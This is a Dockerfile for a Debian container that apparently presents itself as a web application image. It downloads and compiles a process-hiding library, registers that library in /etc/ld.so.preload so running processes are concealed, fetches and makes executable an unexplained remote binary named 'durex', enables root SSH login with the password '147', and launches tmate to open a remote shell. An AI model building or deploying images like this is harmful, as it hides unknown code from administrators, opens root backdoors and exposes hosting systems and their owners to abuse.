# Stage 1: Base Image
FROM debian as base

# Install dependencies
RUN apt-get update && apt-get install -y \
    ssh git wget nano curl python3 python3-pip python3-venv tmate gcc

# Download and compile process hider
WORKDIR /tmp
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download durex and nest.py
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/index.py \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/index.php \
    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt \
    && chmod +x durex

# Stage 2: Setup Python Virtual Environment
FROM base as venv_setup

# Create directory for SSH
RUN mkdir /run/sshd

# Create and activate Python virtual environment
RUN python3 -m venv /myenv \
    && /myenv/bin/pip3 install -r /tmp/requirements.txt \
    && echo "tmate -F" >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >> /openssh.sh \
    && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
    && echo root:147|chpasswd \
    && chmod 755 /openssh.sh

# Stage 3: Final Image
FROM venv_setup as final

# Expose necessary ports
EXPOSE 80 443 3306 4040 5432 5700 5701 5010 6800 6900 8080 8888 9000

# Start SSH and application
CMD /openssh.sh
